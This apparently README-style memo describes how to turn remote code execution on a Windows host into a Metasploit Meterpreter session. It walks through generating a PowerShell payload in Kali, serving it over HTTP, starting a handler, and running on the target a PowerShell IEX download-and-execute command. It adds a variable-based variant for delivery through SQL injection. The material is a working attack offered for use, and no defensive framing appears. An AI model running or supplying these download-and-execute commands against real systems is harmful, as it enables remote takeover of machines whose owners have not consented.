 RCE to Meterpreter session via Powershell<br/>================================================================================<br/><br/>If in a position where a RCE was obtained on a Windows machine and in need to <br/>upgrade to a better shell, than this memo can help.<br/><br/>tl;dr; The ruby script generates a powershell script which will be downloaded <br/>and executed in target box's memory via the use of IEX Powershell command.<br/><br/>It is recommended to run the ruby script in Kali as it uses Metasploit. <br/>Originally this script was created to generate this same technique and payload <br/>for the RubberDucky. The same script it is now recycled for the same goal but <br/>delivered differently.<br/><br/>Steps:<br/> - run the ruby script in kali and follow the steps<br/> - open the created powershell script and copy the line from "powershell -nop" onwards<br/> - save the copied text in a new powershell script (save it as .ps1)<br/> - make the new ps1 script available with SimpleHTTPServer or the like<br/> - in Kali, start a exploit/multi/handler and use the same config defined in step 1<br/> - on the target machine execute the following powershell command(define the IP and port)<br/><br/><br/>`powershell IEX (New-Object Net.WebClient).DownloadString('http://server:port/pwned.ps1');`<br/><br/><br/>The IEX command is a bit picky and it really likes the single quotes. In the past I <br/>had to inject the command via a SQL injection and I couldn't escape or reuse the <br/>sigle quote. The hack that worked for me is the following command:<br/><br/><br/><br/>`powershell Set-Variable -Name "urlz" -Value â€œhttp://server:port/pwned.ps1" ;IEX (New-Object Net.WebClient).DownloadString($urlz);`<br/><br/><br/><br/>Good luck and Have Fun!!!<br/><br/><br/><br/>